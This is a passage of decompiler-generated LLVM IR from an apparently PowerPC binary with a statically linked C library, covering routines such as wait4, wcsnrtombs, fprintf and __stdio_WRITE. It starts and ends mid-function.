  br i1 %v1_10011cc0, label %dec_label_pc_10011ce8, label %dec_label_pc_10011cbc.dec_label_pc_10011cc8_crit_edge

dec_label_pc_10011cbc.dec_label_pc_10011cc8_crit_edge: ; preds = %dec_label_pc_10011cbc
  %v0_10011cc8.pre = load i32, i32* @r30, align 4
  %v3_10011ccc.pre = load i32, i32* @global_var_1002c960.1121, align 4
  br label %dec_label_pc_10011cc8

dec_label_pc_10011cc8:                            ; preds = %dec_label_pc_10011cbc.dec_label_pc_10011cc8_crit_edge, %entry
  %v3_10011ccc = phi i32 [ %v3_10011ccc.pre, %dec_label_pc_10011cbc.dec_label_pc_10011cc8_crit_edge ], [ %v3_10011cb0, %entry ]
  %v1_10011cd4 = phi i32 [ %v0_10011cc8.pre, %dec_label_pc_10011cbc.dec_label_pc_10011cc8_crit_edge ], [ %arg1, %entry ]
  %v3_10011cc8 = icmp eq i32 %v1_10011cd4, 0
  store i32 %v3_10011ccc, i32* @r31, align 4
  br i1 %v3_10011cc8, label %dec_label_pc_10011cec, label %dec_label_pc_10011cdc

dec_label_pc_10011cdc:                            ; preds = %dec_label_pc_10011cc8
  %v2_10011cd4 = add i32 %v1_10011cd4, %v3_10011ccc
  store i32 268508384, i32* @lr, align 4
  %v1_10011cdc = call i32 @__GI_brk(i32 %v2_10011cd4)
  %tmp6 = icmp sgt i32 %v1_10011cdc, -1
  br i1 %tmp6, label %dec_label_pc_10011cdc.dec_label_pc_10011cec_crit_edge, label %dec_label_pc_10011ce8

dec_label_pc_10011cdc.dec_label_pc_10011cec_crit_edge: ; preds = %dec_label_pc_10011cdc
  %v0_10011cf0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011cec

dec_label_pc_10011ce8:                            ; preds = %dec_label_pc_10011cdc, %dec_label_pc_10011cbc
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_10011cec

dec_label_pc_10011cec:                            ; preds = %dec_label_pc_10011cdc.dec_label_pc_10011cec_crit_edge, %dec_label_pc_10011cc8, %dec_label_pc_10011ce8
  %v0_10011cf0 = phi i32 [ %v0_10011cf0.pre, %dec_label_pc_10011cdc.dec_label_pc_10011cec_crit_edge ], [ %v3_10011ccc, %dec_label_pc_10011cc8 ], [ -1, %dec_label_pc_10011ce8 ]
  ret i32 %v0_10011cf0

; uselistorder directives
  uselistorder i32 %v3_10011ccc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_10011cec, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011d1c = call i32 @__asm_mfcr()
  %v1_10011d20 = and i32 %v0_10011d1c, 268435456
  %v3_10011d20 = icmp eq i32 %v1_10011d20, 0
  store i32 %v0_10011d1c, i32* %r31.global-to-local, align 4
  br i1 %v3_10011d20, label %dec_label_pc_10011d38, label %dec_label_pc_10011d2c

dec_label_pc_10011d2c:                            ; preds = %entry
  %v0_10011d2c = call i32 @__errno_location()
  %v0_10011d30 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011d30 = inttoptr i32 %v0_10011d2c to i32*
  store i32 %v0_10011d30, i32* %v2_10011d30, align 4
  br label %dec_label_pc_10011d38

dec_label_pc_10011d38:                            ; preds = %entry, %dec_label_pc_10011d2c
  %v0_10011d48 = phi i32 [ %v0_10011d1c, %entry ], [ -1, %dec_label_pc_10011d2c ]
  ret i32 %v0_10011d48

; uselistorder directives
  uselistorder label %dec_label_pc_10011d38, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002c944.1122 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10011d58 = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_10011d74 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10011d74, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10011d58, label %dec_label_pc_10011d80, label %dec_label_pc_10011d88

dec_label_pc_10011d80:                            ; preds = %entry
  %v2_10011d80 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10011d80, i32* @r3, align 4
  br label %dec_label_pc_10011d88

dec_label_pc_10011d88:                            ; preds = %entry, %dec_label_pc_10011d80
  %v0_10011d8c = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_10011d80 ]
  %v2_10011d88 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_10011d8c, i32* %stack_var_-40, align 4
  store i32 %v2_10011d88, i32* %stack_var_-36, align 4
  store i32 268508568, i32* @lr, align 4
  %v0_10011d94 = call i32 @__GI_wcsnrtombs()
  %v3_10011d98 = icmp eq i32 %v0_10011d94, 0
  br i1 %v3_10011d98, label %dec_label_pc_10011da0, label %dec_label_pc_10011da4

dec_label_pc_10011da0:                            ; preds = %dec_label_pc_10011d88
  br label %dec_label_pc_10011da4

dec_label_pc_10011da4:                            ; preds = %dec_label_pc_10011d88, %dec_label_pc_10011da0
  %v0_10011db0 = phi i32 [ %v0_10011d94, %dec_label_pc_10011d88 ], [ 1, %dec_label_pc_10011da0 ]
  ret i32 %v0_10011db0

; uselistorder directives
  uselistorder label %dec_label_pc_10011da4, { 1, 0 }
  uselistorder label %dec_label_pc_10011d88, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_10011db8 = load i32, i32* @r5, align 4
  store i32 %v0_10011db8, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_10011dc0 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_10011dc0

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10011dc4 = load i32, i32* @r3, align 4
  %v3_10011dc4 = icmp eq i32 %v0_10011dc4, 0
  %v0_10011dc8 = load i32, i32* @lr, align 4
  store i32 %v0_10011dc8, i32* %r0.global-to-local, align 4
  br i1 %v3_10011dc4, label %dec_label_pc_10011df0, label %dec_label_pc_10011dd8

dec_label_pc_10011dd8:                            ; preds = %entry
  %v1_10011dd8 = load i32, i32* @r4, align 4
  %v4_10011dd8 = icmp eq i32 %v0_10011dc4, %v1_10011dd8
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_10011dd8, label %dec_label_pc_10011de4, label %dec_label_pc_10011e1c

dec_label_pc_10011de4:                            ; preds = %dec_label_pc_10011dd8
  %v2_10011de8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10011de8, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011e1c

dec_label_pc_10011df0:                            ; preds = %entry
  %v2_10011de811 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10011de811, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10011e1c

dec_label_pc_10011dfc:                            ; preds = %dec_label_pc_10011e5c.dec_label_pc_10011e3c_crit_edge, %dec_label_pc_10011e3c.preheader
  %v0_10011dfc = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10011e08 = inttoptr i32 %v0_10011dfc to i32*
  store i32 84, i32* %v2_10011e08, align 4
  %v0_10011e80.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011e7c

dec_label_pc_10011e10:                            ; preds = %dec_label_pc_10011e4c
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10011e6c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011e68

dec_label_pc_10011e1c:                            ; preds = %dec_label_pc_10011de4, %dec_label_pc_10011dd8, %dec_label_pc_10011df0
  %v2_10011e4c7 = phi i32 [ %v2_10011de8, %dec_label_pc_10011de4 ], [ %v0_10011dc4, %dec_label_pc_10011dd8 ], [ %v2_10011de811, %dec_label_pc_10011df0 ]
  %v0_10011e1c = load i32, i32* @r5, align 4
  %v1_10011e1c = load i32, i32* @r6, align 4
  %v3_10011e1c = icmp ugt i32 %v0_10011e1c, %v1_10011e1c
  br i1 %v3_10011e1c, label %dec_label_pc_10011e24, label %dec_label_pc_10011e28

dec_label_pc_10011e24:                            ; preds = %dec_label_pc_10011e1c
  store i32 %v1_10011e1c, i32* @r5, align 4
  br label %dec_label_pc_10011e28

dec_label_pc_10011e28:                            ; preds = %dec_label_pc_10011e1c, %dec_label_pc_10011e24
  %v0_10011e34 = phi i32 [ %v0_10011e1c, %dec_label_pc_10011e1c ], [ %v1_10011e1c, %dec_label_pc_10011e24 ]
  %v1_10011e28 = add i32 %v0_10011e34, 1
  store i32 %v1_10011e28, i32* %r0.global-to-local, align 4
  %v0_10011e2c = load i32, i32* @r4, align 4
  %v1_10011e2c = inttoptr i32 %v0_10011e2c to i32*
  %v2_10011e2c = load i32, i32* %v1_10011e2c, align 4
  store i32 %v2_10011e2c, i32* %r11.global-to-local, align 4
  store i32 %v0_10011e34, i32* %r9.global-to-local, align 4
  store i32 %v0_10011e34, i32* %ctr.global-to-local, align 4
  %v2_10011e643 = icmp eq i32 %v0_10011e34, 0
  br i1 %v2_10011e643, label %dec_label_pc_10011e68, label %dec_label_pc_10011e3c.preheader

dec_label_pc_10011e3c.preheader:                  ; preds = %dec_label_pc_10011e28
  %v1_10011e3c16 = inttoptr i32 %v2_10011e2c to i32*
  %v2_10011e3c17 = load i32, i32* %v1_10011e3c16, align 4
  store i32 %v2_10011e3c17, i32* %r0.global-to-local, align 4
  %v1_10011e4018 = add i32 %v2_10011e2c, 4
  store i32 %v1_10011e4018, i32* %r11.global-to-local, align 4
  %v2_10011e4420 = icmp ugt i32 %v2_10011e3c17, 127
  br i1 %v2_10011e4420, label %dec_label_pc_10011dfc, label %dec_label_pc_10011e4c.lr.ph

dec_label_pc_10011e4c.lr.ph:                      ; preds = %dec_label_pc_10011e3c.preheader
  %extract.t = trunc i32 %v2_10011e3c17 to i8
  br label %dec_label_pc_10011e4c

dec_label_pc_10011e4c:                            ; preds = %dec_label_pc_10011e4c.lr.ph, %dec_label_pc_10011e5c.dec_label_pc_10011e3c_crit_edge
  %v2_10011e3c23.off0 = phi i8 [ %extract.t, %dec_label_pc_10011e4c.lr.ph ], [ %extract.t24, %dec_label_pc_10011e5c.dec_label_pc_10011e3c_crit_edge ]
  %v2_10011e4c22 = phi i32 [ %v2_10011e4c7, %dec_label_pc_10011e4c.lr.ph ], [ %v2_10011e5c, %dec_label_pc_10011e5c.dec_label_pc_10011e3c_crit_edge ]
  %v3_10011e4c = inttoptr i32 %v2_10011e4c22 to i8*
  store i8 %v2_10011e3c23.off0, i8* %v3_10011e4c, align 1
  %v0_10011e50 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011e50 = urem i32 %v0_10011e50, 256
  store i32 %v1_10011e50, i32* %r0.global-to-local, align 4
  %v3_10011e54 = icmp eq i32 %v1_10011e50, 0
  br i1 %v3_10011e54, label %dec_label_pc_10011e10, label %dec_label_pc_10011e5c

dec_label_pc_10011e5c:                            ; preds = %dec_label_pc_10011e4c
  %v0_10011e5c = load i32, i32* @r3, align 4
  %v1_10011e5c = load i32, i32* %r10.global-to-local, align 4
  %v2_10011e5c = add i32 %v1_10011e5c, %v0_10011e5c
  store i32 %v2_10011e5c, i32* @r3, align 4
  %v0_10011e60 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011e60 = add i32 %v0_10011e60, -1
  store i32 %v1_10011e60, i32* %r9.global-to-local, align 4
  %v0_10011e64 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011e64 = add i32 %v0_10011e64, -1
  store i32 %v1_10011e64, i32* %ctr.global-to-local, align 4
  %v2_10011e64 = icmp eq i32 %v1_10011e64, 0
  br i1 %v2_10011e64, label %dec_label_pc_10011e68, label %dec_label_pc_10011e5c.dec_label_pc_10011e3c_crit_edge

dec_label_pc_10011e5c.dec_label_pc_10011e3c_crit_edge: ; preds = %dec_label_pc_10011e5c
  %v0_10011e3c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10011e3c = inttoptr i32 %v0_10011e3c.pre to i32*
  %v2_10011e3c = load i32, i32* %v1_10011e3c, align 4
  store i32 %v2_10011e3c, i32* %r0.global-to-local, align 4
  %v1_10011e40 = add i32 %v0_10011e3c.pre, 4
  store i32 %v1_10011e40, i32* %r11.global-to-local, align 4
  %v2_10011e44 = icmp ugt i32 %v2_10011e3c, 127
  %extract.t24 = trunc i32 %v2_10011e3c to i8
  br i1 %v2_10011e44, label %dec_label_pc_10011dfc, label %dec_label_pc_10011e4c

dec_label_pc_10011e68:                            ; preds = %dec_label_pc_10011e5c, %dec_label_pc_10011e28, %dec_label_pc_10011e10
  %v0_10011e6c = phi i32 [ %v0_10011e6c.pre, %dec_label_pc_10011e10 ], [ %v2_10011e4c7, %dec_label_pc_10011e28 ], [ %v2_10011e5c, %dec_label_pc_10011e5c ]
  %v2_10011e68 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10011e68, i32* %r0.global-to-local, align 4
  %v4_10011e6c = icmp eq i32 %v0_10011e6c, %v2_10011e68
  br i1 %v4_10011e6c, label %dec_label_pc_10011e78, label %dec_label_pc_10011e74

dec_label_pc_10011e74:                            ; preds = %dec_label_pc_10011e68
  %v0_10011e74 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011e74 = load i32, i32* @r4, align 4
  %v2_10011e74 = inttoptr i32 %v1_10011e74 to i32*
  store i32 %v0_10011e74, i32* %v2_10011e74, align 4
  br label %dec_label_pc_10011e78

dec_label_pc_10011e78:                            ; preds = %dec_label_pc_10011e68, %dec_label_pc_10011e74
  %v0_10011e78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011e78 = load i32, i32* @r5, align 4
  %v2_10011e78 = sub i32 %v1_10011e78, %v0_10011e78
  store i32 %v2_10011e78, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011e7c

dec_label_pc_10011e7c:                            ; preds = %dec_label_pc_10011dfc, %dec_label_pc_10011e78
  %v0_10011e80 = phi i32 [ %v0_10011e80.pre, %dec_label_pc_10011dfc ], [ %v2_10011e78, %dec_label_pc_10011e78 ]
  store i32 %v0_10011dc8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10011e80

; uselistorder directives
  uselistorder i32 %v1_10011e64, { 1, 0 }
  uselistorder i32 %v2_10011e5c, { 0, 2, 1 }
  uselistorder i32 %v1_10011e50, { 1, 0 }
  uselistorder i32 %v0_10011e34, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10011e4c7, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32 84, { 4, 6, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_10011e7c, { 1, 0 }
  uselistorder label %dec_label_pc_10011e78, { 1, 0 }
  uselistorder label %dec_label_pc_10011e4c, { 1, 0 }
  uselistorder label %dec_label_pc_10011e28, { 1, 0 }
  uselistorder label %dec_label_pc_10011e1c, { 2, 0, 1 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_10011e9c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10011e9c, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10011ef4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10011ef4, i32* %stack_var_-96, align 4
  store i32 268508928, i32* @lr, align 4
  %v0_10011efc = call i32 @__GI_vfprintf()
  ret i32 %v0_10011efc
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10011f10 = load i32, i32* @lr, align 4
  store i32 %v0_10011f10, i32* %r0.global-to-local, align 4
  %v0_10011f1c = load i32, i32* @r5, align 4
  store i32 %v0_10011f1c, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10011f1c, i32* @r31, align 4
  %v3_10011f303 = icmp eq i32 %v0_10011f1c, 0
  store i32 %v0_10011f1c, i32* @r27, align 4
  br i1 %v3_10011f303, label %dec_label_pc_10011fd8, label %dec_label_pc_10011f40

dec_label_pc_10011f40:                            ; preds = %entry, %dec_label_pc_10011f60
  %v0_10011f50 = phi i32 [ %v2_10011f60, %dec_label_pc_10011f60 ], [ %arg2, %entry ]
  %v1_10011f40.in = phi i32 [ %v2_10011f64, %dec_label_pc_10011f60 ], [ %v0_10011f1c, %entry ]
  %v1_10011f40 = icmp sgt i32 %v1_10011f40.in, 0
  br i1 %v1_10011f40, label %dec_label_pc_10011f4c, label %dec_label_pc_10011f44

dec_label_pc_10011f44:                            ; preds = %dec_label_pc_10011f40
  br label %dec_label_pc_10011f4c

dec_label_pc_10011f4c:                            ; preds = %dec_label_pc_10011f40, %dec_label_pc_10011f44
  %v0_10011f4c = load i32, i32* @r30, align 4
  %v1_10011f4c = add i32 %v0_10011f4c, 4
  %v2_10011f4c = inttoptr i32 %v1_10011f4c to i32*
  %v3_10011f4c = load i32, i32* %v2_10011f4c, align 4
  store i32 268509016, i32* @lr, align 4
  %v3_10011f54 = call i32 @__libc_write(i32 %v3_10011f4c, i32 %v0_10011f50)
  %v1_10011f58 = icmp slt i32 %v3_10011f54, 0
  br i1 %v1_10011f58, label %dec_label_pc_10011f6c, label %dec_label_pc_10011f60

dec_label_pc_10011f60:                            ; preds = %dec_label_pc_10011f4c
  %v0_10011f60 = load i32, i32* @r29, align 4
  %v2_10011f60 = add i32 %v0_10011f60, %v3_10011f54
  store i32 %v2_10011f60, i32* @r29, align 4
  %v1_10011f64 = load i32, i32* @r31, align 4
  %v2_10011f64 = sub i32 %v1_10011f64, %v3_10011f54
  store i32 %v2_10011f64, i32* @r31, align 4
  %v3_10011f30 = icmp eq i32 %v2_10011f64, 0
  store i32 %v2_10011f64, i32* @r27, align 4
  br i1 %v3_10011f30, label %dec_label_pc_10011f30.dec_label_pc_10011fd8.loopexit_crit_edge, label %dec_label_pc_10011f40

dec_label_pc_10011f6c:                            ; preds = %dec_label_pc_10011f4c
  %v0_10011f6c = load i32, i32* @r30, align 4
  %v1_10011f6c = add i32 %v0_10011f6c, 8
  %v2_10011f6c = inttoptr i32 %v1_10011f6c to i32*
  %v3_10011f6c = load i32, i32* %v2_10011f6c, align 4
  store i32 %v3_10011f6c, i32* %r11.global-to-local, align 4
  %v1_10011f70 = add i32 %v0_10011f6c, 12
  %v2_10011f70 = inttoptr i32 %v1_10011f70 to i32*
  %v3_10011f70 = load i32, i32* %v2_10011f70, align 4
  store i32 %v3_10011f70, i32* %r0.global-to-local, align 4
  %v1_10011f74 = inttoptr i32 %v0_10011f6c to i16*
  %v2_10011f74 = load i16, i16* %v1_10011f74, align 2
  %v2_10011f78 = sub i32 %v3_10011f70, %v3_10011f6c
  store i32 %v2_10011f78, i32* %r0.global-to-local, align 4
  %v5_10011f78 = icmp eq i32 %v2_10011f78, 0
  %v1_10011f7c = or i16 %v2_10011f74, 8
  store i16 %v1_10011f7c, i16* %v1_10011f74, align 2
  br i1 %v5_10011f78, label %dec_label_pc_10011f6c.dec_label_pc_10011fd4_crit_edge, label %dec_label_pc_10011f88

dec_label_pc_10011f6c.dec_label_pc_10011fd4_crit_edge: ; preds = %dec_label_pc_10011f6c
  %v0_10011fd4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011fd4

dec_label_pc_10011f88:                            ; preds = %dec_label_pc_10011f6c
  %v0_10011f88 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011f88 = load i32, i32* @r31, align 4
  %v3_10011f88 = icmp ugt i32 %v0_10011f88, %v1_10011f88
  br i1 %v3_10011f88, label %dec_label_pc_10011f88.dec_label_pc_10011f94_crit_edge, label %dec_label_pc_10011f90

dec_label_pc_10011f88.dec_label_pc_10011f94_crit_edge: ; preds = %dec_label_pc_10011f88
  %v0_10011f94.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10011f94

dec_label_pc_10011f90:                            ; preds = %dec_label_pc_10011f88
  store i32 %v0_10011f88, i32* @r27, align 4
  br label %dec_label_pc_10011f94

dec_label_pc_10011f94:                            ; preds = %dec_label_pc_10011f88.dec_label_pc_10011f94_crit_edge, %dec_label_pc_10011f90
  %v0_10011f94 = phi i32 [ %v0_10011f94.pre, %dec_label_pc_10011f88.dec_label_pc_10011f94_crit_edge ], [ %v0_10011f88, %dec_label_pc_10011f90 ]
  store i32 %v0_10011f94, i32* %ctr.global-to-local, align 4
  %v2_10011fa0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011f98

dec_label_pc_10011f98:                            ; preds = %dec_label_pc_10011fbc, %dec_label_pc_10011f94
  %v2_10011fa0 = phi i32 [ %v1_10011fbc, %dec_label_pc_10011fbc ], [ %v2_10011fa0.pre, %dec_label_pc_10011f94 ]
  %v0_10011f98 = load i32, i32* @r29, align 4
  %v1_10011f98 = inttoptr i32 %v0_10011f98 to i8*
  %v2_10011f98 = load i8, i8* %v1_10011f98, align 1
  %v3_10011f98 = zext i8 %v2_10011f98 to i32
  store i32 %v3_10011f98, i32* %r0.global-to-local, align 4
  %v1_10011f9c = add i32 %v0_10011f98, 1
  store i32 %v1_10011f9c, i32* @r29, align 4
  %v3_10011fa0 = inttoptr i32 %v2_10011fa0 to i8*
  store i8 %v2_10011f98, i8* %v3_10011fa0, align 1
  %v0_10011fa4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011fa4 = urem i32 %v0_10011fa4, 256
  store i32 %v1_10011fa4, i32* %r0.global-to-local, align 4
  %v3_10011fa8 = icmp eq i32 %v1_10011fa4, 10
  br i1 %v3_10011fa8, label %dec_label_pc_10011fb0, label %dec_label_pc_10011fbc

dec_label_pc_10011fb0:                            ; preds = %dec_label_pc_10011f98
  %v0_10011fb0 = load i32, i32* @r30, align 4
  %v1_10011fb0 = inttoptr i32 %v0_10011fb0 to i16*
  %v2_10011fb0 = load i16, i16* %v1_10011fb0, align 2
  %v3_10011fb0 = zext i16 %v2_10011fb0 to i32
  store i32 %v3_10011fb0, i32* %r0.global-to-local, align 4
  %v1_10011fb4 = and i32 %v3_10011fb0, 256
  %v3_10011fb4 = icmp eq i32 %v1_10011fb4, 0
  br i1 %v3_10011fb4, label %dec_label_pc_10011fbc, label %dec_label_pc_10011fb0.dec_label_pc_10011fc4_crit_edge

dec_label_pc_10011fb0.dec_label_pc_10011fc4_crit_edge: ; preds = %dec_label_pc_10011fb0
  %v0_10011fc8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011fc4

dec_label_pc_10011fbc:                            ; preds = %dec_label_pc_10011fb0, %dec_label_pc_10011f98
  %v0_10011fbc = load i32, i32* %r11.global-to-local, align 4
  %v1_10011fbc = add i32 %v0_10011fbc, 1
  store i32 %v1_10011fbc, i32* %r11.global-to-local, align 4
  %v0_10011fc0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011fc0 = add i32 %v0_10011fc0, -1
  store i32 %v1_10011fc0, i32* %ctr.global-to-local, align 4
  %v2_10011fc0 = icmp eq i32 %v1_10011fc0, 0
  br i1 %v2_10011fc0, label %dec_label_pc_10011fbc.dec_label_pc_10011fc4_crit_edge, label %dec_label_pc_10011f98

dec_label_pc_10011fbc.dec_label_pc_10011fc4_crit_edge: ; preds = %dec_label_pc_10011fbc
  %v0_10011fc4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10011fc4

dec_label_pc_10011fc4:                            ; preds = %dec_label_pc_10011fb0.dec_label_pc_10011fc4_crit_edge, %dec_label_pc_10011fbc.dec_label_pc_10011fc4_crit_edge
  %v0_10011fc8 = phi i32 [ %v1_10011fbc, %dec_label_pc_10011fbc.dec_label_pc_10011fc4_crit_edge ], [ %v0_10011fc8.pre, %dec_label_pc_10011fb0.dec_label_pc_10011fc4_crit_edge ]
  %v0_10011fc4 = phi i32 [ %v0_10011fc4.pre, %dec_label_pc_10011fbc.dec_label_pc_10011fc4_crit_edge ], [ %v0_10011fb0, %dec_label_pc_10011fb0.dec_label_pc_10011fc4_crit_edge ]
  %v1_10011fc4 = add i32 %v0_10011fc4, 8
  %v2_10011fc4 = inttoptr i32 %v1_10011fc4 to i32*
  %v3_10011fc4 = load i32, i32* %v2_10011fc4, align 4
  store i32 %v3_10011fc4, i32* %r0.global-to-local, align 4
  %v2_10011fc8 = add i32 %v0_10011fc4, 16
  %v3_10011fc8 = inttoptr i32 %v2_10011fc8 to i32*
  store i32 %v0_10011fc8, i32* %v3_10011fc8, align 4
  %v0_10011fcc = load i32, i32* %r0.global-to-local, align 4
  %v1_10011fcc = load i32, i32* %r11.global-to-local, align 4
  %v2_10011fcc = sub i32 %v1_10011fcc, %v0_10011fcc
  store i32 %v2_10011fcc, i32* %r0.global-to-local, align 4
  %v1_10011fd0 = load i32, i32* @r31, align 4
  %v2_10011fd0 = sub i32 %v1_10011fd0, %v2_10011fcc
  store i32 %v2_10011fd0, i32* @r31, align 4
  br label %dec_label_pc_10011fd4

dec_label_pc_10011fd4:                            ; preds = %dec_label_pc_10011f6c.dec_label_pc_10011fd4_crit_edge, %dec_label_pc_10011fc4
  %v0_10011fd4 = phi i32 [ %v0_10011fd4.pre, %dec_label_pc_10011f6c.dec_label_pc_10011fd4_crit_edge ], [ %v2_10011fd0, %dec_label_pc_10011fc4 ]
  %v1_10011fd4 = load i32, i32* @r28, align 4
  %v2_10011fd4 = sub i32 %v1_10011fd4, %v0_10011fd4
  store i32 %v2_10011fd4, i32* @r28, align 4
  br label %dec_label_pc_10011fd8

dec_label_pc_10011f30.dec_label_pc_10011fd8.loopexit_crit_edge: ; preds = %dec_label_pc_10011f60
  %v0_10011fdc.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10011fd8

dec_label_pc_10011fd8:                            ; preds = %entry, %dec_label_pc_10011f30.dec_label_pc_10011fd8.loopexit_crit_edge, %dec_label_pc_10011fd4
  %v0_10011fdc = phi i32 [ %v2_10011fd4, %dec_label_pc_10011fd4 ], [ %v0_10011fdc.pre.pre, %dec_label_pc_10011f30.dec_label_pc_10011fd8.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_10011f10, i32* %r0.global-to-local, align 4
  ret i32 %v0_10011fdc

; uselistorder directives
  uselistorder i32 %v0_10011fc4, { 1, 0 }
  uselistorder i32 %v1_10011fc0, { 1, 0 }
  uselistorder i32 %v1_10011fbc, { 0, 2, 1 }
  uselistorder i32 %v1_10011fa4, { 1, 0 }
  uselistorder i32 %v2_10011f64, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10011f60, { 1, 0 }
  uselistorder i32 %v3_10011f54, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder i32 (i32, i32)* @__libc_write, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011fd8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011fd4, { 1, 0 }
  uselistorder label %dec_label_pc_10011fc4, { 1, 0 }
  uselistorder label %dec_label_pc_10011f94, { 1, 0 }
  uselistorder label %dec_label_pc_10011f4c, { 1, 0 }
  uselistorder label %dec_label_pc_10011f40, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_10011ff0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_1001200c = load i16, i16* %arg3, align 2
  %v1_10012010 = and i16 %v3_1001200c, 512
  %v3_10012010 = icmp eq i16 %v1_10012010, 0
  br i1 %v3_10012010, label %dec_label_pc_10012018, label %dec_label_pc_10012124

dec_label_pc_10012018:                            ; preds = %entry
  %v2_10012018 = add i32 %tmp, 4
  %v3_10012018 = inttoptr i32 %v2_10012018 to i32*
  %v4_10012018 = load i32, i32* %v3_10012018, align 4
  %v2_1001201c = add i32 %tmp, 16
  %v3_1001201c = inttoptr i32 %v2_1001201c to i32*
  %v4_1001201c = load i32, i32* %v3_1001201c, align 4
  store i32 %v4_1001201c, i32* @r3, align 4
  %v3_10012020 = icmp eq i32 %v4_10012018, -2
  %v2_10012024 = add i32 %tmp, 12
  %v3_10012024 = inttoptr i32 %v2_10012024 to i32*
  %v4_10012024 = load i32, i32* %v3_10012024, align 4
